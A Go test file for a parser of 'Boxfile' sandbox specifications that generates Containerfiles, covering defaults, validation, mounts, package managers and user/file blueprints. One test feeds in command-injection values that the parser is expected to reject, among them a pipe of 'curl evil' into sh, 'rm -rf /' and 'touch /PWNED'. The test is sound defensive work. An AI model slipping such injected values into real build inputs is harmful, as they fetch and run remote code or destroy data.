package boxfile

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func write(t *testing.T, body string) string {
	t.Helper()
	p := filepath.Join(t.TempDir(), "Boxfile")
	if err := os.WriteFile(p, []byte(body), 0o644); err != nil {
		t.Fatal(err)
	}
	return p
}

func TestParseDefaultsAndOverrides(t *testing.T) {
	s, err := Parse(write(t, `
base: docker.io/library/alpine:latest
cpus: 4
ram_mib: 4096
network: none
readonly: true
timeout_seconds: 60
packages:
  - ripgrep
  - python3
run:
  - pip3 install requests
env:
  LANG: C.UTF-8
`))
	if err != nil {
		t.Fatal(err)
	}
	if s.CPUs != 4 || s.RAMMiB != 4096 || s.Network != "none" {
		t.Errorf("core fields wrong: %+v", s)
	}
	if !s.ReadOnlyRootfs || s.TimeoutSeconds != 60 {
		t.Errorf("restriction fields wrong: %+v", s)
	}
	if got := strings.Join(s.Packages, ","); got != "ripgrep,python3" {
		t.Errorf("packages wrong: %q", got)
	}
	if len(s.Run) != 1 || s.Env["LANG"] != "C.UTF-8" {
		t.Errorf("run/env wrong: %+v", s)
	}
}

// Omitted keys fall back to Default rather than zero values.
func TestDefaultsApplyToOmittedKeys(t *testing.T) {
	s, err := Parse(write(t, "base: docker.io/library/alpine:latest\n"))
	if err != nil {
		t.Fatal(err)
	}
	if s.CPUs != Default.CPUs || s.RAMMiB != Default.RAMMiB || s.Network != Default.Network {
		t.Errorf("defaults not applied: %+v", s)
	}
}

func TestValidation(t *testing.T) {
	cases := map[string]string{
		"cpus too high":    "base: x\ncpus: 99\n",
		"cpus zero":        "base: x\ncpus: 0\n",
		"bad network":      "base: x\nnetwork: wifi\n",
		"tiny ram":         "base: x\nram_mib: 4\n",
		"negative timeout": "base: x\ntimeout_seconds: -1\n",
		"empty base":       "base: \"\"\n",
		"unknown key":      "base: x\nwidgets: 3\n",
		"wrong type":       "base: x\ncpus: many\n",
		"unclosed list":    "base: x\npackages: [jq\n",
		"unterminated str": "base: \"oops\ncpus: 2\n",
	}
	for name, body := range cases {
		if _, err := Parse(write(t, body)); err == nil {
			t.Errorf("%s: expected error, got none", name)
		}
	}
}

// Values that would change the structure of the generated Containerfile are
// rejected at parse time rather than escaped at render time.
func TestGrammarValidation(t *testing.T) {
	cases := map[string]string{
		"newline in env value": "base: x\nenv:\n  A: \"one\\ntwo\"\n",
		"bad env key":          "base: x\nenv:\n  \"a-b\": v\n",
		"non-octal mode":       "base: docker.io/library/alpine\nblueprint:\n  write_files:\n    - path: /etc/x\n      content: y\n      mode: \"0755; curl evil|sh\"\n",
		"path injection":       "base: docker.io/library/alpine\nblueprint:\n  write_files:\n    - path: \"/tmp/x; touch /PWNED # \"\n      content: y\n      mode: \"0644\"\n",
		"user with space":      "base: docker.io/library/alpine\nblueprint:\n  users:\n    - name: \"a b\"\n",
		"relative shell":       "base: docker.io/library/alpine\nblueprint:\n  users:\n    - name: a\n      shell: bash\n",
		"package injection":    "base: x\npackages:\n  - \"jq; rm -rf /\"\n",
		"base with space":      "base: \"a b\"\n",
	}
	for name, body := range cases {
		p := write(t, body)
		if _, err := Parse(p); err == nil {
			t.Errorf("%s: expected error, got none", name)
		}
	}
}

// Mounts are normalized at parse time: tilde expanded, mode defaulted to ro.
func TestMountsNormalize(t *testing.T) {
	t.Setenv("HOME", "/home/tester")
	s, err := Parse(write(t, "base: docker.io/library/alpine\nmounts:\n  - host: ~/proj\n    guest: /work\n"))
	if err != nil {
		t.Fatal(err)
	}
	m := s.Mounts[0]
	if m.Host != "/home/tester/proj" || m.Guest != "/work" || m.Mode != "ro" {
		t.Errorf("mount not normalized: %+v", m)
	}
}

func TestMountValidation(t *testing.T) {
	cases := map[string]string{
		"relative host":  "base: x\nmounts:\n  - host: rel/dir\n    guest: /work\n",
		"colon in host":  "base: x\nmounts:\n  - host: /tmp/a:b\n    guest: /work\n",
		"relative guest": "base: x\nmounts:\n  - host: /tmp/h\n    guest: work\n",
		"bad mode":       "base: x\nmounts:\n  - host: /tmp/h\n    guest: /work\n    mode: w\n",
		"dup guest":      "base: x\nmounts:\n  - host: /tmp/a\n    guest: /work\n  - host: /tmp/b\n    guest: /work\n",
		"shadows /data":  "base: x\nmounts:\n  - host: /tmp/a\n    guest: /data\n",
	}
	for name, body := range cases {
		if _, err := Parse(write(t, body)); err == nil {
			t.Errorf("%s: expected error, got none", name)
		}
	}
}

// Everything shipped under examples/ must keep parsing as the validation
// rules grow.
func TestShippedExamplesStillParse(t *testing.T) {
	matches, err := filepath.Glob("../../examples/*/Boxfile")
	if err != nil || len(matches) == 0 {
		t.Fatalf("no example Boxfiles found: %v", err)
	}
	for _, p := range matches {
		if _, err := Parse(p); err != nil {
			t.Errorf("%s: %v", p, err)
		}
	}
}

func TestPackageManagerSelection(t *testing.T) {
	cases := []struct{ base, want string }{
		{"docker.io/library/alpine:latest", "apk add --no-cache"},
		{"docker.io/library/debian:bookworm-slim", "apt-get install"},
		{"docker.io/library/ubuntu:24.04", "apt-get install"},
		{"docker.io/library/fedora:41", "dnf install"},
		{"quay.io/centos/centos:stream9", "dnf install"},
	}
	for _, c := range cases {
		s, err := Parse(write(t, "base: "+c.base+"\npackages: [jq]\n"))
		if err != nil {
			t.Errorf("%s: %v", c.base, err)
			continue
		}
		if cf := s.Containerfile(); !strings.Contains(cf, c.want) {
			t.Errorf("%s: want %q in:\n%s", c.base, c.want, cf)
		}
	}
}

func TestPackageManagerCleanup(t *testing.T) {
	apt, _ := Parse(write(t, "base: docker.io/library/debian:12\npackages: [jq]\n"))
	if !strings.Contains(apt.Containerfile(), "rm -rf /var/lib/apt/lists") {
		t.Error("apt should clean its lists")
	}
	dnf, _ := Parse(write(t, "base: docker.io/library/fedora:41\npackages: [jq]\n"))
	if !strings.Contains(dnf.Containerfile(), "dnf clean all") {
		t.Error("dnf should clean its cache")
	}
}

// An unrecognised base must fail at parse time rather than generate a
// Containerfile that dies partway through the build.
func TestUnknownBaseNeedsPkgmgr(t *testing.T) {
	if _, err := Parse(write(t, "base: example.com/custom:1\npackages: [jq]\n")); err == nil {
		t.Error("expected an error asking for pkgmgr")
	}
	s, err := Parse(write(t, "base: example.com/custom:1\npkgmgr: apt\npackages: [jq]\n"))
	if err != nil {
		t.Fatalf("pkgmgr override should work: %v", err)
	}
	if !strings.Contains(s.Containerfile(), "apt-get install") {
		t.Errorf("pkgmgr override ignored:\n%s", s.Containerfile())
	}
	// No packages means no package manager is needed at all.
	if _, err := Parse(write(t, "base: example.com/custom:1\n")); err != nil {
		t.Errorf("base with no packages should parse: %v", err)
	}
	if _, err := Parse(write(t, "base: alpine\npkgmgr: yum\npackages: [jq]\n")); err == nil {
		t.Error("expected an error for an unknown pkgmgr")
	}
}

func TestContainerfileStructure(t *testing.T) {
	s, _ := Parse(write(t, "base: b\nenv:\n  K: V\nrun:\n  - echo hi\n"))
	cf := s.Containerfile()
	if !strings.HasPrefix(cf, "# generated") {
		t.Error("missing generated header")
	}
	if !strings.Contains(cf, "FROM b") || !strings.Contains(cf, "ENV K=V") ||
		!strings.Contains(cf, "RUN echo hi") || !strings.HasSuffix(cf, "WORKDIR /data\n") {
		t.Errorf("structure wrong:\n%s", cf)
	}
}

// Go map iteration is random, so env must be sorted or the generated
// Containerfile changes between runs and busts podman's layer cache.
func TestEnvOrderIsDeterministic(t *testing.T) {
	src := "base: b\nenv:\n  Z: 1\n  A: 2\n  M: 3\n"
	first, _ := Parse(write(t, src))
	want := first.Containerfile()
	for i := 0; i < 20; i++ {
		s, _ := Parse(write(t, src))
		if got := s.Containerfile(); got != want {
			t.Fatalf("output not deterministic:\n%s\nvs\n%s", want, got)
		}
	}
	if !strings.Contains(want, "ENV A=2\nENV M=3\nENV Z=1") {
		t.Errorf("env not sorted:\n%s", want)
	}
}

func TestCommentsAndEmptyFile(t *testing.T) {
	s, err := Parse(write(t, "# just a comment\nbase: b   # trailing\ncpus: 3\n"))
	if err != nil {
		t.Fatal(err)
	}
	if s.Base != "b" || s.CPUs != 3 {
		t.Errorf("comment handling wrong: %+v", s)
	}
	// An empty file is valid: every default applies.
	if _, err := Parse(write(t, "")); err != nil {
		t.Errorf("empty file should use defaults: %v", err)
	}
}

func TestBlueprintRendersUsersFilesAndCommands(t *testing.T) {
	dir := t.TempDir()
	p := filepath.Join(dir, "Boxfile")
	os.WriteFile(p, []byte(`
base: docker.io/library/debian:12
blueprint:
  users:
    - name: admin
      shell: /bin/bash
      sudo: true
  write_files:
    - path: /etc/motd
      content: "hi\n"
    - path: /usr/local/bin/x
      content: "#!/bin/sh\necho x\n"
      mode: "0755"
  runcmd:
    - echo done
`), 0o644)
	s, err := Parse(p)
	if err != nil {
		t.Fatal(err)
	}
	cf, err := s.Render(dir)
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{
		"useradd -m -s /bin/bash admin", // apt base uses useradd, not adduser
		"sudoers.d/admin",
		"COPY .blueprint/f0 /etc/motd",
		"COPY .blueprint/f1 /usr/local/bin/x",
		"RUN chmod 0755 /usr/local/bin/x",
		"RUN echo done",
	} {
		if !strings.Contains(cf, want) {
			t.Errorf("missing %q in:\n%s", want, cf)
		}
	}
	// Contents are materialised verbatim into the build context.
	got, err := os.ReadFile(filepath.Join(dir, ".blueprint", "f0"))
	if err != nil || string(got) != "hi\n" {
		t.Errorf("asset f0 wrong: %q %v", got, err)
	}
}

// Alpine has no useradd, so the apk path must use adduser instead.
func TestBlueprintUserCommandPerDistro(t *testing.T) {
	dir := t.TempDir()
	p := filepath.Join(dir, "Boxfile")
	os.WriteFile(p, []byte("base: docker.io/library/alpine:latest\n"+
		"blueprint:\n  users:\n    - name: a\n"), 0o644)
	s, _ := Parse(p)
	if cf, _ := s.Render(dir); !strings.Contains(cf, "adduser -D -s /bin/sh a") {
		t.Errorf("alpine should use adduser:\n%s", cf)
	}
}

// Removing a write_files entry must not leave its asset behind.
func TestRenderClearsStaleAssets(t *testing.T) {
	dir := t.TempDir()
	stale := filepath.Join(dir, ".blueprint", "f9")
	os.MkdirAll(filepath.Dir(stale), 0o755)
	os.WriteFile(stale, []byte("old"), 0o644)
	s := Default
	if _, err := s.Render(dir); err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(stale); !os.IsNotExist(err) {
		t.Error("stale blueprint asset survived Render")
	}
}

func TestBlueprintValidation(t *testing.T) {
	cases := map[string]string{
		"relative path":  "base: docker.io/library/alpine\nblueprint:\n  write_files:\n    - path: etc/x\n      content: y\n",
		"empty user":     "base: docker.io/library/alpine\nblueprint:\n  users:\n    - name: \"\"\n",
		"user needs mgr": "base: example.com/x:1\nblueprint:\n  users:\n    - name: a\n",
	}
	for name, body := range cases {
		p := filepath.Join(t.TempDir(), "Boxfile")
		os.WriteFile(p, []byte(body), 0o644)
		if _, err := Parse(p); err == nil {
			t.Errorf("%s: expected error, got none", name)
		}
	}
}

func TestWarmupLinesMustBeNonEmpty(t *testing.T) {
	for _, bad := range []string{"warmup: ['']", "warmup: ['   ']"} {
		p := filepath.Join(t.TempDir(), "Boxfile")
		os.WriteFile(p, []byte(bad+"\n"), 0o644)
		if _, err := Parse(p); err == nil {
			t.Errorf("%q parsed", bad)
		}
	}
}

func TestIsolation(t *testing.T) {
	cases := []struct {
		yaml string
		ok   bool
	}{
		{"", true}, // defaults to standard
		{"isolation: strict", true},
		{"isolation: strict\nmounts:\n  - {host: /tmp, guest: /in}", true},
		{"isolation: strict\nmounts:\n  - {host: /tmp, guest: /out, mode: rw}", false},
		{"isolation: standard\nmounts:\n  - {host: /tmp, guest: /out, mode: rw}", true},
		{"isolation: paranoid", false},
	}
	for _, c := range cases {
		p := filepath.Join(t.TempDir(), "Boxfile")
		os.WriteFile(p, []byte(c.yaml+"\n"), 0o644)
		s, err := Parse(p)
		if (err == nil) != c.ok {
			t.Errorf("%q: err = %v, want ok=%v", c.yaml, err, c.ok)
		}
		if err == nil && s.Isolation == "" {
			t.Errorf("%q: isolation left empty", c.yaml)
		}
	}
}
